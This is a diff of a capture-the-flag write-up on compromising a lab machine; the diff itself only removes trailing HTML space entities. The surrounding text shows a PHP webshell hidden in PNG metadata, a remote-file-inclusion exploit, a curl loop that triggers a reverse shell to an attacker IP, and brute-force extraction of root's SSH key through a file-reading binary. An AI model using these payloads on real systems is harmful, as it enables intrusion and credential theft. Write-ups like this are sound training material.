@@ -15,7 +15,7 @@ PORT      STATE    SERVICE
 80/tcp    open     http
 ```
 
-We don't need to add any domains for this machine. Since only port 80 is open, we should be proxying the traffic through Burpsuite.&#x20;
+We don't need to add any domains for this machine. Since only port 80 is open, we should be proxying the traffic through Burpsuite.
 
 ### Image Gallery Enumeration
 
@@ -77,7 +77,7 @@ Cookie: XSRF-TOKEN=eyJpdiI6ImM2YmgvbDlaMlA1RE1vdmhmNUE4NXc9PSIsInZhbHVlIjoiaFJiS
 {"genres":"food,travel,nature"}
 ```
 
-I did a `gobuster` scan for the `/api` directory and a `feroxbuster` scan on the general website to find more stuff too.&#x20;
+I did a `gobuster` scan for the `/api` directory and a `feroxbuster` scan on the general website to find more stuff too.
 
 `feroxbuster` picked up on one interesting file:
 
@@ -117,7 +117,7 @@ The v2 API also comes with some neat features we are testing that could allow us
 ```
 {% endcode %}
 
-So the API takes the calculated hashed password of the user and passes it for authentication, meaning that if we were to get hashes, we don't actually need to crack them at all. This v2 API looks rather suspicious, but I was unable to interact with it much as no directory scans were returning anything useful.&#x20;
+So the API takes the calculated hashed password of the user and passes it for authentication, meaning that if we were to get hashes, we don't actually need to crack them at all. This v2 API looks rather suspicious, but I was unable to interact with it much as no directory scans were returning anything useful.
 
 This was when I got stuck.
 
@@ -292,7 +292,7 @@ The above exploit uses an RFI to load some PHP objects for RCE. We can test this
 
 <figure><img src="../../.gitbook/assets/image (2924).png" alt=""><figcaption></figcaption></figure>
 
-Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.&#x20;
+Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.
 
 ```
 $ convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png
@@ -301,7 +301,7 @@ $ convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.pn
 Host this image on a HTTP server, and now comes the tricky part of uploading it (which involves some brute forcing). There seem to be 2 payloads involved in this:
 
 * One involving `vid:ms1:/tmp/php*`.
-* One with the form-data uploading `positive.png` to the server as `cmd.php`.&#x20;
+* One with the form-data uploading `positive.png` to the server as `cmd.php`.
 
 To start this, we can follow the PoC and use Burp Intruder to do send a lot of requests. Here's the first request:
 
@@ -354,11 +354,11 @@ $ while true; do curl -G --data-urlencode 'a=$sock=fsockopen("10.10.14.64",4444)
 ```
 {% endcode %}
 
-Then, we just need to start both the payloads within Burpsuite Intruder with NULL requests.&#x20;
+Then, we just need to start both the payloads within Burpsuite Intruder with NULL requests.
 
 <figure><img src="../../.gitbook/assets/image (2659).png" alt=""><figcaption></figcaption></figure>
 
-When we run it both the Intruder instances, we would get a few requests to our Python HTTP server, and a reverse shell as `www-data`!&#x20;
+When we run it both the Intruder instances, we would get a few requests to our Python HTTP server, and a reverse shell as `www-data`!
 
 <figure><img src="../../.gitbook/assets/image (3180).png" alt=""><figcaption></figcaption></figure>
 
@@ -433,7 +433,7 @@ To add an exception for this directory, call:
         git config --global --add safe.directory /var/www/html/intentions
 ```
 
-In this case, what we can do is just copy the entire `.git` folder using `tar`, as `zip` and `7z` are both not present on the machine.&#x20;
+In this case, what we can do is just copy the entire `.git` folder using `tar`, as `zip` and `7z` are both not present on the machine.
 
 ```bash
 cp -r .git /tmp/.git
@@ -473,7 +473,7 @@ drwxr-xr-x 3 root root       4096 Jun 10 15:14 ..
 -rwxr-x--- 1 root scanner 1437696 Jun 19 11:18 scanner
 ```
 
-This file is too big for reverse engineering, so let's do some dynamic analysis (AKA running it and seeing what it does).&#x20;
+This file is too big for reverse engineering, so let's do some dynamic analysis (AKA running it and seeing what it does).
 
 ```
 greg@intentions:/opt/scanner$ ./scanner 
@@ -511,7 +511,7 @@ greg@intentions:/opt/scanner$ getcap scanner
 scanner cap_dac_read_search=ep
 ```
 
-This basically means that the `scanner` binary can read **any file in the system**. Since this file can read any file and tell us the hash of this file, we can use it to check whether files exist too.&#x20;
+This basically means that the `scanner` binary can read **any file in the system**. Since this file can read any file and tell us the hash of this file, we can use it to check whether files exist too.
 
 ```
 greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/.ssh/id_rsa
@@ -552,7 +552,7 @@ for c in charset:
         break
 ```
 
-Using that, it is possible to brute force the hash slowly by replacing the hash each time.&#x20;
+Using that, it is possible to brute force the hash slowly by replacing the hash each time.
 
 ```
 greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt -l 1
@@ -633,7 +633,7 @@ This would eventually get the correct hash out for us to submit.
 
 ### Key Brute Force -> Root Shell
 
-I felt a bit weird just capturing the root flag, so let's modify our script a bit more to get the private SSH key of the `root` user.&#x20;
+I felt a bit weird just capturing the root flag, so let's modify our script a bit more to get the private SSH key of the `root` user.
 
 {% code overflow="wrap" %}
 ```bash
@@ -642,7 +642,7 @@ greg@intentions:/opt/scanner$ for i in {1..3000}; do ./scanner -p -s 2 -c /root/
 ```
 {% endcode %}
 
-The 3000 limit would trigger a lot of errors since it attempts to read more characters than actually present, so we can just Ctrl + C it when that happens. It still generates the file containing all debug hashes properly.&#x20;
+The 3000 limit would trigger a lot of errors since it attempts to read more characters than actually present, so we can just Ctrl + C it when that happens. It still generates the file containing all debug hashes properly.
 
 We can then transfer this to our machine via hosting the `output.txt` file on a Python HTTP server on the machine, and doing some `awk` magic on it to get it into Python list format:
 
@@ -680,4 +680,4 @@ Then, just use this to `ssh` in as `root`:
 
 <figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
